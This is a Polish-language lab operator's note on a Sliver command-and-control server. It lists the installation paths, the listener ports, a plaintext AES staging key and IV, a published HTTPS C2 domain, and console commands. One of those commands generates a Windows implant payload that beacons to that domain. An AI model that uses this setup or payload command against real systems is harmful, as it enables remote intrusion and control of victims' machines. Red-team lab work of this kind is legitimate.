---
tags:
  - sliver
  - c2
  - lab
updated: 2026-08-14
---

# Sliver C2

Powiązane: [[Infrastruktura_C2]] · [[Cloudflare_Konfiguracja]]

> Notatka operatorska labu. Nie mieszać z raportami próbek w `Analizy/`.

## Instalacja (C2 #1)

| | |
|--|--|
| Wersja | **v1.7.3** — compiled 2026-02-24, commit `3bbaf805` |
| Server | `/opt/tools/bin/sliver-server` |
| Client | `/opt/tools/bin/sliver-client` (`/usr/local/bin/sliver`) |
| Unit | `sliver.service` enabled, active od 2026-08-12 14:45 UTC |
| Home | `/root/.sliver` |
| Status | `/usr/local/bin/sliver-status` |
| Tmux | sesja `sliver` (od Aug 11) |

## Listenery

| Bind | Port | Rola |
|------|------|------|
| `127.0.0.1` | 443 | HTTPS (wejście tylko przez Cloudflare) |
| `*` | 8443 | AES staging TCP |
| `*` | 31337 | multiplayer |

Staging AES (lab):

```
key: D(G+KbPeShVmYq3t
iv:  8y/B?E(G+KbPeShV
```

Profil HTTPS publikowany jako `https://c2.maskencrypt.eu`.

## Komendy

```bash
# klient
sliver

# Generowanie payloadu
generate --http https://c2.maskencrypt.eu --os windows --save payload.exe

# Lista sesji / beaconów (w konsoli)
sessions
beacons
jobs

# Zapis do Obsidian — NIE MA `sessions --save`
# ( --save jest tylko przy generate )
/root/obsidian-vault/Narzedzia/export_sliver_to_obsidian.sh
# → Projekty/Infrastruktura_C2/sessions.md

# status hosta
sliver-status
journalctl -u sliver -f
```

## Uwagi z 14.08

- Analiza PE **nie** ruszała Sliver (patrz [[Lab/Recap 2026-08-14]]).
- Próbka `178cb931` **nie** jest typowym implantem Sliver.
- 31337 nasłuchuje na `*` — jeśli multiplayer ma być tylko operatorski, zamknąć UFW do localhost/VPN.
